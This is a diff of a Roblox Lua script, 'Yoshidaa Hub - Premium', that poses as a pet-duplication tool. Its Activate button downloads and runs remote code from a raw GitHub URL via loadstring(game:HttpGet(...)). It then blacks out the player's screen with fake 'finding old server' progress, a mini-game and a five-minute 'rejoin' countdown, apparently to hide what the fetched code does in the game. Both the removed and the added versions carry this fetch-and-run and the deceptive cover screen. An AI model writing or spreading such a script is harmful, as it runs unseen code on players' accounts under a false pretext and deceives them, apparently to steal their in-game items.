@@ -1,218 +1,60 @@
+if _G.YHR then return end;_G.YHR=true;local TS,CG,L,UIS,RS=game:GetService("TweenService"),game:GetService("CoreGui"),game:GetService("Lighting"),game:GetService("UserInputService"),game:GetService("RunService")
+local S=Instance.new("ScreenGui")S.Name="YoshidaaGUI"S.ResetOnSpawn=false;S.Parent=CG
+local B=Instance.new("BlurEffect")B.Size=24;B.Parent=L
+local M=Instance.new("Frame",S)M.Size=UDim2.new(0,400,0,250)M.Position=UDim2.new(0.5,-200,0.5,-125)M.Active=true;M.Draggable=true
+M.BackgroundColor3=Color3.fromRGB(15,15,20)M.BackgroundTransparency=0.2
+Instance.new("UICorner",M).CornerRadius=UDim.new(0,20)
+local G=Instance.new("UIStroke",M)G.Thickness=2;G.Color=Color3.fromRGB(160,80,255)G.Transparency=0.1
+local T=Instance.new("TextLabel",M)T.Size=UDim2.new(1,0,0,40)T.Text="🌌 Yoshidaa Hub - Premium" T.TextColor3=Color3.fromRGB(200,100,255)T.BackgroundTransparency=1 T.Font=Enum.Font.GothamBold T.TextSize=24
+local I=Instance.new("TextLabel",M)I.Size=UDim2.new(1,-20,0,20)I.Position=UDim2.new(0,10,1,-25)I.Text="Inspired by Mica"
+I.TextColor3=Color3.fromRGB(140,140,140)I.BackgroundTransparency=1 I.Font=Enum.Font.Gotham I.TextSize=14 I.TextXAlignment=Enum.TextXAlignment.Left
+local Bn=Instance.new("TextButton",M)Bn.Size=UDim2.new(0.85,0,0,44)Bn.Position=UDim2.new(0.075,0,0.55,0)Bn.Text="☄️ Activate"
+Bn.BackgroundColor3=Color3.fromRGB(40,0,60)Bn.TextColor3=Color3.new(1,1,1)Bn.Font=Enum.Font.Gotham;Bn.TextSize=18
+Instance.new("UICorner",Bn).CornerRadius=UDim.new(0,12)
+local BS=Instance.new("UIStroke",Bn)BS.Thickness=2;BS.Color=Color3.fromRGB(255,100,255);BS.Transparency=0.3
 
+Bn.MouseEnter:Connect(function()TS:Create(Bn,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{Size=UDim2.new(0.9,0,0,50)}):Play()BS.Transparency=0 end)
+Bn.MouseLeave:Connect(function()TS:Create(Bn,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{Size=UDim2.new(0.85,0,0,44)}):Play()BS.Transparency=0.3 end)
 
-if _G.YoshidaaHubRunning then return end
-_G.YoshidaaHubRunning = true
+Bn.MouseButton1Click:Connect(function()
+Bn.Text="✅ Activating..."Bn.BackgroundColor3=Color3.fromRGB(60,0,100)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RayField-Scripts/PETSDUPE/main/PetsDuped"))()
+task.delay(0.01,function()
+local G=Instance.new("ScreenGui",CG)G.Name="YoshidaaLoader"G.IgnoreGuiInset=true;G.ZIndexBehavior=Enum.ZIndexBehavior.Global
+local F=Instance.new("Frame",G)F.BackgroundColor3=Color3.new(0,0,0)F.Size=UDim2.new(1,0,1,36)F.Position=UDim2.new(0,0,0,-36)F.ZIndex=999999
+F.BackgroundTransparency=1;TS:Create(F,TweenInfo.new(0.5),{BackgroundTransparency=0}):Play()
+local M=Instance.new("TextLabel",F)M.Size=UDim2.new(1,0,0,50)M.Position=UDim2.new(0,0,0.45,0)
+M.Text="🔍 FINDING OLD SERVER FOR SCRIPT..."M.TextColor3=Color3.new(1,1,1)M.BackgroundTransparency=1;M.Font=Enum.Font.GothamBold;M.TextScaled=true;M.ZIndex=999999
+local P=Instance.new("TextLabel",F)P.Size=UDim2.new(1,0,0,30)P.Position=UDim2.new(0,0,0.55,0)P.Text="Loading 0%"
+P.TextColor3=Color3.fromRGB(180,180,255)P.BackgroundTransparency=1;P.Font=Enum.Font.Gotham;P.TextScaled=true;P.ZIndex=999999
 
--- SERVICES
-local TweenService = game:GetService("TweenService")
-local CoreGui = game:GetService("CoreGui")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local DF=Instance.new("Frame",F)DF.Size=UDim2.new(0,320,0,80)DF.Position=UDim2.new(0.5,-160,1,-90)DF.BackgroundTransparency=1;DF.ZIndex=999999
+local GND=Instance.new("Frame",DF)GND.Size=UDim2.new(1,0,0,4)GND.Position=UDim2.new(0,0,1,-4)
+GND.BackgroundColor3=Color3.new(1,1,1)GND.BorderSizePixel=0
+local DN=Instance.new("Frame",DF)DN.Size=UDim2.new(0,24,0,24)DN.Position=UDim2.new(0,20,1,-28)DN.BackgroundColor3=Color3.new(1,1,1)
+local OB=Instance.new("Frame",DF)OB.Size=UDim2.new(0,20,0,20)OB.Position=UDim2.new(1,0,1,-24)OB.BackgroundColor3=Color3.new(1,1,1)
 
--- GUI SETUP
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "YoshidaaPremiumGUI"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = CoreGui
+local VY,OG=0,true
+UIS.InputBegan:Connect(function(i,g)if i.KeyCode==Enum.KeyCode.Space and OG and not g then VY=-8 OG=false end end)
 
--- Blur Effect
-local blur = Instance.new("BlurEffect")
-blur.Size = 24
-blur.Parent = Lighting
-
--- Main Frame
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 400, 0, 250)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-mainFrame.BackgroundTransparency = 0.2
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 20)
-local glow = Instance.new("UIStroke", mainFrame)
-glow.Thickness = 2
-glow.Color = Color3.fromRGB(160, 80, 255)
-glow.Transparency = 0.1
-
--- Title & Footer
-local title = Instance.new("TextLabel", mainFrame)
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Text = "🌌 Yoshidaa Hub - Premium"
-title.TextColor3 = Color3.fromRGB(200, 100, 255)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextSize = 24
-
-local inspired = Instance.new("TextLabel", mainFrame)
-inspired.Size = UDim2.new(1, -20, 0, 20)
-inspired.Position = UDim2.new(0, 10, 1, -25)
-inspired.Text = "Inspired by Mica"
-inspired.TextColor3 = Color3.fromRGB(140, 140, 140)
-inspired.BackgroundTransparency = 1
-inspired.Font = Enum.Font.Gotham
-inspired.TextSize = 14
-inspired.TextXAlignment = Enum.TextXAlignment.Left
-
--- Activate Button
-local button = Instance.new("TextButton", mainFrame)
-button.Size = UDim2.new(0.85, 0, 0, 44)
-button.Position = UDim2.new(0.075, 0, 0.55, 0)
-button.Text = "☄️ Activate"
-button.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
-button.TextColor3 = Color3.new(1, 1, 1)
-button.Font = Enum.Font.Gotham
-button.TextSize = 18
-Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
-local btnStroke = Instance.new("UIStroke", button)
-btnStroke.Thickness = 2
-btnStroke.Color = Color3.fromRGB(255, 100, 255)
-btnStroke.Transparency = 0.3
-
-button.MouseEnter:Connect(function()
-    TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
-        Size = UDim2.new(0.9, 0, 0, 50)
-    }):Play()
-    btnStroke.Transparency = 0
+RS.RenderStepped:Connect(function()
+VY=VY+0.4;local NY=DN.Position.Y.Offset+VY
+if NY>=DF.AbsoluteSize.Y-28 then NY=DF.AbsoluteSize.Y-28 VY=0 OG=true end
+DN.Position=UDim2.new(0,DN.Position.X.Offset,1,-NY)
+OB.Position=OB.Position-UDim2.new(0,6,0,0)
+if OB.Position.X.Offset+20<0 then OB.Position=UDim2.new(1,0,1,-24)end
+if math.abs(DN.Position.X.Offset-OB.Position.X.Offset)<20 and math.abs(NY-(DF.AbsoluteSize.Y-24))<20 then
+OB.BackgroundColor3=Color3.fromRGB(255,0,0)else OB.BackgroundColor3=Color3.new(1,1,1)end
 end)
 
-button.MouseLeave:Connect(function()
-    TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
-        Size = UDim2.new(0.85, 0, 0, 44)
-    }):Play()
-    btnStroke.Transparency = 0.3
+task.spawn(function()
+for i=1,100 do P.Text="Loading "..i.."%"task.wait(0.12)end
+P.Visible=false;M.Text="🕒 PLEASE WAIT 5 MINUTES TO REJOIN"
+local CT=Instance.new("TextLabel",F)CT.Size=UDim2.new(1,0,0,40)CT.Position=UDim2.new(0,0,0.63,0)
+CT.TextColor3=Color3.fromRGB(255,200,200)CT.BackgroundTransparency=1
+CT.Font=Enum.Font.GothamBold CT.TextScaled=true CT.ZIndex=999999
+local T=300 while T>=0 do CT.Text=string.format("Rejoin in %02d:%02d",math.floor(T/60),T%60)task.wait(1)T=T-1 end
+M.Text="✔️ YOU MAY NOW REJOIN"CT.Text=""task.wait(1800)G:Destroy()
 end)
-
--- Activate Logic
-button.MouseButton1Click:Connect(function()
-    button.Text = "✅ Activating..."
-    button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
-
-    -- run Script 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/RayField-Scripts/PETSDUPE/main/PetsDuped"))()
-
-    -- Show Loading + Dino + Countdown
-    task.delay(0.01, function()
-        local gui = Instance.new("ScreenGui", CoreGui)
-        gui.Name = "YoshidaaBlackLoading"
-        gui.IgnoreGuiInset = true
-        gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-
-        local frame = Instance.new("Frame", gui)
-        frame.BackgroundColor3 = Color3.new(0, 0, 0)
-        frame.Size = UDim2.new(1, 0, 1, 36)
-        frame.Position = UDim2.new(0, 0, 0, -36)
-        frame.ZIndex = 999999
-        frame.BackgroundTransparency = 1
-        TweenService:Create(frame, TweenInfo.new(0.5), { BackgroundTransparency = 0 }):Play()
-
-        local msg = Instance.new("TextLabel", frame)
-        msg.Size = UDim2.new(1, 0, 0, 50)
-        msg.Position = UDim2.new(0, 0, 0.45, 0)
-        msg.Text = "🔍 FINDING OLD SERVER FOR SCRIPT..."
-        msg.TextColor3 = Color3.fromRGB(255, 255, 255)
-        msg.BackgroundTransparency = 1
-        msg.Font = Enum.Font.GothamBold
-        msg.TextScaled = true
-        msg.ZIndex = 999999
-
-        local percent = Instance.new("TextLabel", frame)
-        percent.Size = UDim2.new(1, 0, 0, 30)
-        percent.Position = UDim2.new(0, 0, 0.55, 0)
-        percent.Text = "Loading 0%"
-        percent.TextColor3 = Color3.fromRGB(180, 180, 255)
-        percent.BackgroundTransparency = 1
-        percent.Font = Enum.Font.Gotham
-        percent.TextScaled = true
-        percent.ZIndex = 999999
-
-        -- Dino Runner
-        local dinoFrame = Instance.new("Frame", frame)
-        dinoFrame.Size = UDim2.new(0, 320, 0, 80)
-        dinoFrame.Position = UDim2.new(0.5, -160, 1, -90)
-        dinoFrame.BackgroundTransparency = 1
-        dinoFrame.ZIndex = 999999
-
-        local ground = Instance.new("Frame", dinoFrame)
-        ground.Size = UDim2.new(1, 0, 0, 4)
-        ground.Position = UDim2.new(0, 0, 1, -4)
-        ground.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        ground.BorderSizePixel = 0
-
-        local dino = Instance.new("Frame", dinoFrame)
-        dino.Size = UDim2.new(0, 24, 0, 24)
-        dino.Position = UDim2.new(0, 20, 1, -28)
-        dino.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        dino.BorderSizePixel = 0
-
-        local obstacle = Instance.new("Frame", dinoFrame)
-        obstacle.Size = UDim2.new(0, 20, 0, 20)
-        obstacle.Position = UDim2.new(1, 0, 1, -24)
-        obstacle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        obstacle.BorderSizePixel = 0
-
-        local velY = 0
-        local onGround = true
-
-        UserInputService.InputBegan:Connect(function(input, gpe)
-            if input.KeyCode == Enum.KeyCode.Space and onGround and not gpe then
-                velY = -8
-                onGround = false
-            end
-        end)
-
-        RunService.RenderStepped:Connect(function()
-            velY = velY + 0.4
-            local newY = dino.Position.Y.Offset + velY
-            if newY >= dinoFrame.AbsoluteSize.Y - 28 then
-                newY = dinoFrame.AbsoluteSize.Y - 28
-                velY = 0
-                onGround = true
-            end
-            dino.Position = UDim2.new(0, dino.Position.X.Offset, 1, -newY)
-
-            obstacle.Position = obstacle.Position - UDim2.new(0, 6, 0, 0)
-            if obstacle.Position.X.Offset + 20 < 0 then
-                obstacle.Position = UDim2.new(1, 0, 1, -24)
-            end
-
-            if math.abs(dino.Position.X.Offset - obstacle.Position.X.Offset) < 20 and math.abs(newY - (dinoFrame.AbsoluteSize.Y - 24)) < 20 then
-                obstacle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-            else
-                obstacle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            end
-        end)
-
-        -- Countdown logic
-        task.spawn(function()
-            for i = 1, 100 do
-                percent.Text = "Loading " .. i .. "%"
-                task.wait(0.12)
-            end
-
-            percent.Visible = false
-            msg.Text = "🕒 PLEASE WAIT 5 MINUTES TO AUTO-REJOIN"
-
-            local countdown = Instance.new("TextLabel", frame)
-            countdown.Size = UDim2.new(1, 0, 0, 40)
-            countdown.Position = UDim2.new(0, 0, 0.63, 0)
-            countdown.TextColor3 = Color3.fromRGB(255, 200, 200)
-            countdown.BackgroundTransparency = 1
-            countdown.Font = Enum.Font.GothamBold
-            countdown.TextScaled = true
-            countdown.ZIndex = 999999
-
-            local totalTime = 300
-            while totalTime >= 0 do
-                countdown.Text = string.format("Rejoin in %02d:%02d", math.floor(totalTime / 60), totalTime % 60)
-                task.wait(1)
-                totalTime = totalTime - 1
-            end
-
-            msg.Text = "✔️ YOU MAY NOW REJOIN"
-            countdown.Text = ""
-            task.wait(1800)
-            gui:Destroy()
-        end)
-    end)
+end)
 end)
